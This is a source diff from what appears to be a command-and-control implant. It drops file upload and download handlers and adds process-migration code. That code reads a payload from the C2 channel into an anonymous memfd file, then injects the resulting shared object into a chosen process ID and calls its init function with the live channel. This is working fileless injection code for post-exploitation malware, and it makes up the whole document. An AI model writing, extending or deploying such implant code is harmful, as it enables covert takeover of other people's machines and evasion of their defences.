@@ -22,41 +22,55 @@
  * SOFTWARE.
  */
 
-#include <c2.h>
+#include <limits.h>
+#include <syscall.h>
+#include <injector.h>
+
 #include <tlv.h>
+#include <migrate.h>
 
-static tlv_pkt_t *sys_push(tlv_pkt_t *tlv_packet)
+/*
+ * Perform reading from socket for further migration.
+ */
+
+int migrate_init(tlv_pkt_t *tlv_pkt, pid_t migrate_pid)
 {
-    tlv_pkt_t **tlv_argv;
-    tlv_argv_read(tlv_packet, &tlv_argv, 1, TLV_NULL);
+    #ifdef LINUX
+    int fd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
 
-    if (tlv_channel_read_file(tlv_packet, tlv_argv[0]->data) < 0)
+    if (fd >= 0)
     {
-        tlv_argv_free(tlv_argv, 1);
-        return create_c2_tlv_pkt(tlv_packet, API_CALL_RW_ERROR);
-    }
+        tlv_channel_read_file_fd(tlv_pkt, fd);
 
-    tlv_argv_free(tlv_argv, 1);
-    return create_c2_tlv_pkt(tlv_packet, API_CALL_SUCCESS);
+        char image[PATH_MAX];
+        sprintf(&image, "/proc/self/fd/%d", fd);
+
+        migrate_inject(tlv_pkt, migrate_pid, image);
+        return 0;
+    }
+    #endif
+
+    return -1;
 }
 
-static tlv_pkt_t *sys_pull(tlv_pkt_t *tlv_packet)
+/*
+ * Inject shared object.
+ */
+
+int migrate_inject(tlv_pkt_t *tlv_pkt, pid_t migrate_pid, char *image)
 {
-    tlv_pkt_t **tlv_argv;
-    tlv_argv_read(tlv_packet, &tlv_argv, 1, TLV_NULL);
+    injector_t *injector;
+    void *handle = NULL;
 
-    if (tlv_channel_send_file(tlv_packet, tlv_argv[0]->data) < 0)
-    {
-        tlv_argv_free(tlv_argv, 1);
-        return create_c2_tlv_pkt(tlv_packet, API_CALL_RW_ERROR);
-    }
+    if (injector_attach(&injector, migrate_pid) != 0)
+        return -1;
 
-    tlv_argv_free(tlv_argv, 1);
-    return create_c2_tlv_pkt(tlv_packet, API_CALL_SUCCESS);
-}
+    if (injector_inject(injector, image, &handle) != 0)
+        return -1;
 
-void register_sys_api_calls(c2_api_calls_t **c2_api_calls_table)
-{
-    c2_register_api_call(c2_api_calls_table, API_CALL, sys_push, API_POOL_PEX);
-    c2_register_api_call(c2_api_calls_table, API_CALL + 1, sys_pull, API_POOL_PEX);
+    if (injector_call(injector, handle, "init", tlv_pkt->channel) != 0)
+        return -1;
+
+    injector_detach(injector);
+    return 0;
 }
